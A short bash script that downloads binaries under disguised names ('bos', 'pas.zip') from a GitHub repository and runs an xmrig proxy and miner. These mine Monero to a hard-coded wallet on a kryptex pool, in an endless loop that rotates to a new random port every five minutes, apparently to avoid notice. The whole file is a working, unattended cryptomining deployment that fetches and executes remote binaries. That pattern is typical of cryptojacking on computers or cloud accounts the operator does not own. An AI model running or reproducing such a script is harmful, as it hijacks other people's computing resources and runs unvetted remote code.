#!/bin/bash
curl -O -L -J https://github.com/dolmerda26/vigilant-fortnight/raw/refs/heads/main/bos
curl -O -L -J https://github.com/dolmerda26/vigilant-fortnight/raw/refs/heads/main/pas.zip
unzip pas.zip
chmod +x proxy
chmod +x bos
WALLET="89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.ROT"
POOL="xmr.kryptex.network:7029"

while true; do
    # Generate unused random port
    PORT=$(comm -23 <(seq 99 65000 | sort) <(ss -tuln | awk '{print $5}' | grep -o '[0-9]*$' | sort -u) | shuf -n 1)

    echo "====================================="
    echo "Starting new session on port: $PORT"
    echo "====================================="

    # Start xmrig-proxy
    ./proxy -o $POOL -u $WALLET -p x -b 127.0.0.1:$PORT &
    PROXY_PID=$!

    sleep 3

    # Start xmrig
    ./bos -o 127.0.0.1:$PORT -u $WALLET -p x -t 8 &
    MINER_PID=$!

    # Run for 5 minutes (600 seconds)
    sleep 300

    echo "Rotating port..."

    # Kill both processes
    kill $MINER_PID
    kill $PROXY_PID

    sleep 5

done
